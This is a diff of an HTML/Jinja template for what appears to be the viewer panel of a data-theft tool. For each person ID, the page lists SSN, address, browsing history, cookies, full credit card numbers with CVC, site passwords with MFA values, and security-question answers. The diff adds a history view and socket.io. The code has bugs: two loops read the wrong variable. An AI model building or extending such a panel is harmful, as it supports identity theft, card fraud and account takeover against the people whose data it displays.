@@ -1,111 +1,142 @@
 <!DOCTYPE html>
 <html lang="en">
-{#<head>#}
-{#    <meta charset="utf-8">#}
-{#    <meta name="viewport" content="width=device-width, initial-scale=1">#}
-{#    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">#}
-{#    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>#}
-{#    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>#}
-{#    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>#}
-{#</head>#}
-{#<body>#}
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.3/socket.io.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+
+</head>
+<body>
 <div padding="40px">
-<div>
-    <h2>General Information for {{ data[0] }} </h2>
-    <h4>ID: {{ data[0] }}</h4>
-    <h4>Cell Phone: {{ data[1] }}</h4>
-    <h4>Address: {{ data[2] }}</h4>
-    <h4>Email: {{ data[3] }}</h4>
-    <h4>SSN: {{ data[4] }}</h4>
-    <h4>First Name: {{ data[5] }}</h4>
-    <h4>Last Name: {{ data[6] }}</h4>
-    <h4>Date of Birth: {{ data[7] }}</h4>
-    <h4>City: {{ data[9] }}</h4>
-    <h4>Country: {{ data[10] }}</h4>
-    <h4>Zip Code: {{ data[11] }}</h4>
-    <h4>State: {{ data[12] }}</h4>
-    <br>
-</div>
+    <div>
+        <h2>General Information for {{ data[0] }} </h2>
+        <h4>ID: {{ data[0] }}</h4>
+        <h4>Cell Phone: {{ data[1] }}</h4>
+        <h4>Address: {{ data[2] }}</h4>
+        <h4>Email: {{ data[3] }}</h4>
+        <h4>SSN: {{ data[4] }}</h4>
+        <h4>First Name: {{ data[5] }}</h4>
+        <h4>Last Name: {{ data[6] }}</h4>
+        <h4>Date of Birth: {{ data[7] }}</h4>
+        <h4>City: {{ data[9] }}</h4>
+        <h4>Country: {{ data[10] }}</h4>
+        <h4>Zip Code: {{ data[11] }}</h4>
+        <h4>State: {{ data[12] }}</h4>
+        <br>
+    </div>
 
 
-<div>
-    <h2>Browsing History for {{ data[0] }} </h2>
-    <h4>{{ history }}</h4>
-</div>
+    <div id="bh">
+        {% if fullbh is equalto 'true' %}
+            <h2>Browsing History for {{ data[0] }}</h2>
+        {% else %}
+        <h2>Browsing History for {{ data[0] }}
+            <button class="btn btn-primary" style="margin-left:10px;" onclick="var new_page = window.open();
+                    new_page.document.write('<h2>Browsing History for {{ data[0] }}</h2>');
+                    new_page.document.write(document.getElementById('bh{{ data[0] }}').innerHTML);
+                    new_page.document.title = {{ data[0] }} + ' Browsing History';
+                    " id="viewAll">View All
+            </button>
+        </h2>
+        {% endif %}
 
-
-<div>
-    <h2>Cookies for {{ data[0] }} </h2>
-    {% if cookies|length > 0 %}
-        {% for item in cookies %}
-            <h4>URL: {{ item[1] }}</h4>
-            <h4>Content: {{ item[2] }}</h4>
-            <h4>Name: {{ item[3] }}</h4>
-            <br>
-        {% endfor %}
-    {% else %}
-        <div>
-            <h4>N/A</h4>
+        <div id="bh{{ data[0] }}">
+            {% if history|length > 0 %}
+                {% set count = [5] %}
+                {% for item in history %}
+                    {% if loop.index is lessthan 5 or fullbh is equalto 'true'%}
+                        <h4>{{ item }}</h4>
+                    {% elif fullbh is equalto 'false'%}
+                        <h4 id="hidden" class="collapse">{{ item }}</h4>
+                    {% endif %}
+                {% endfor %}
+            {% else %}
+                <div>
+                    <h4>N/A</h4>
+                </div>
+            {% endif %}
         </div>
-    {% endif %}
-</div>
+    </div>
 
 
-<div>
-    <h2>Credit Cards for {{ data[0] }} </h2>
-    {% if creditcards|length > 0 %}
-        {% for card in creditcards %}
-            <h4>Credit Card Number: {{ card[0] }}</h4>
-            <h4>CVC: {{ card[1] }}</h4>
-            <h4>Expiration Date: {{ card[2] }}</h4>
-            <h4>Type: {{ card[4] }}</h4>
-            <br>
-        {% endfor %}
-    {% else %}
-        <div>
-            <h4>N/A</h4>
-        </div>
-    {% endif %}
+    <div>
+        <h2>Cookies for {{ data[0] }} </h2>
+        {% if cookies|length > 0 %}
+            {% for item in cookies %}
+                <h4>URL: {{ item[1] }}</h4>
+                <h4>Content: {{ item[2] }}</h4>
+                <h4>Name: {{ item[3] }}</h4>
+                <br>
+            {% endfor %}
+        {% else %}
+            <div>
+                <h4>N/A</h4>
+            </div>
+        {% endif %}
+    </div>
+
+
+    <div>
+        <h2>Credit Cards for {{ data[0] }} </h2>
+        {% if creditcards|length > 0 %}
+            {% for card in creditcards %}
+                <h4>Credit Card Number: {{ card[0] }}</h4>
+                <h4>CVC: {{ card[1] }}</h4>
+                <h4>Expiration Date: {{ card[2] }}</h4>
+                <h4>Type: {{ card[4] }}</h4>
+                <br>
+            {% endfor %}
+        {% else %}
+            <div>
+                <h4>N/A</h4>
+            </div>
+        {% endif %}
+    </div>
+
+    <div>
+        <h2>Credentials for {{ data[0] }} </h2>
+        {% if credentials|length > 0 %}
+            {% for info in credentials %}
+                <h4>URL: {{ card[2] }}</h4>
+                <h4>Username: {{ card[0] }}</h4>
+                <h4>Password: {{ card[1] }}</h4>
+                <h4>MFA: {{ card[4] }}</h4>
+                <br>
+            {% endfor %}
+        {% else %}
+            <div>
+                <h4>N/A</h4>
+            </div>
+        {% endif %}
+    </div>
+
+    <div>
+        <h2>Security Questions for {{ data[0] }} </h2>
+        {% if questions|length > 0 %}
+            {% for question in questions %}
+                <h2>URL: {{ card[3] }}</h2>
+                <h2>Question: {{ card[1] }}</h2>
+                <h2>Answer: {{ card[2] }}</h2>
+                <br>
+            {% endfor %}
+        {% else %}
+            <div>
+                <h4>N/A</h4>
+            </div>
+        {% endif %}
+    </div>
 </div>
 
-<div>
-    <h2>Credentials for {{ data[0] }} </h2>
-    {% if credentials|length > 0 %}
-        {% for info in credentials %}
-            <h4>URL: {{ card[2] }}</h4>
-            <h4>Username: {{ card[0] }}</h4>
-            <h4>Password: {{ card[1] }}</h4>
-            <h4>MFA: {{ card[4] }}</h4>
-            <br>
-        {% endfor %}
-    {% else %}
-        <div>
-            <h4>N/A</h4>
-        </div>
-    {% endif %}
-</div>
+<style>
+    h2 {
+        font-weight: bold;
+    }
 
-<div>
-    <h2>Security Questions for {{ data[0] }} </h2>
-    {% if questions|length > 0 %}
-        {% for question in questions %}
-            <h2>URL: {{ card[3] }}</h2>
-            <h2>Question: {{ card[1] }}</h2>
-            <h2>Answer: {{ card[2] }}</h2>
-            <br>
-        {% endfor %}
-    {% else %}
-        <div>
-            <h4>N/A</h4>
-        </div>
-    {% endif %}
-</div>
-</div>
-{##}
-{#</body>#}
-{#<style>#}
-{#    h2 {#}
-{#        font-weight: bold;#}
-{#    }#}
-{#</style>#}
-{#</html>#}
+</style>
+</body>
+</html>
